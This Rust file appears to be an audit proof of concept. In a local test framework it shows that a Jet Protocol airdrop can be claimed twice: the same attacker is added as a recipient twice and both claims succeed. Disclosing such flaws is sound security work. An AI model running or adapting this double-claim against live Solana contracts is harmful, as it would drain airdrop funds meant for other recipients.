mod framework;

use anchor_lang::AccountDeserialize;
use framework::{clone_keypair, Framework};
use jet_rewards::AirdropRecipientParam;
use jet_staking::state::StakeAccount;
use std::error::Error;

use anchor_client::solana_sdk::{signature::Keypair, signer::Signer};

use poc_framework::Environment;

fn main() -> Result<(), Box<dyn Error>> {
    airdrop_double_claim()?;

    Ok(())
}

/// demonstrates how an airdrop can be claimed twice by the same recipient due to duplicates
fn airdrop_double_claim() -> Result<(), Box<dyn Error>> {
    println!("double claiming with airdrop..");

    let mut test_env = Framework::new()?;
    let attacker = clone_keypair(&test_env.attacker);

    // setup
    test_env.init_stake_pool()?;
    test_env.create_user_auth(&attacker)?;
    test_env.authenticate_user(&attacker)?;
    test_env.init_stake_account(&attacker)?;

    // create airdrop
    let airdrop = Keypair::new();
    test_env.create_airdrop(&airdrop, i64::MAX)?;
    // transfer tokens into the airdrop vault
    test_env.env.mint_tokens(
        test_env.vault_token_mint.pubkey(),
        &test_env.pool_authority,
        test_env.reward_vault_pubkey(airdrop.pubkey(), "".to_string()),
        1000,
    );

    const AIRDROP_AMT: u64 = 100;

    let recipients = vec![AirdropRecipientParam {
        amount: AIRDROP_AMT,
        recipient: attacker.pubkey(),
    }];
    test_env.airdrop_add_recipients(recipients.clone(), airdrop.pubkey(), 0)?;
    test_env.airdrop_claim(&attacker, airdrop.pubkey())?;
    test_env.airdrop_add_recipients(recipients, airdrop.pubkey(), 1)?;
    test_env.airdrop_claim(&attacker, airdrop.pubkey())?;

    println!("each airdrop amt: {}", AIRDROP_AMT);
    println!(
        "stake account bal: {}",
        StakeAccount::try_deserialize(
            &mut &*test_env
                .env
                .get_account(test_env.stake_account_pubkey(&attacker))
                .unwrap()
                .data
        )?
        .shares
    );

    Ok(())
}
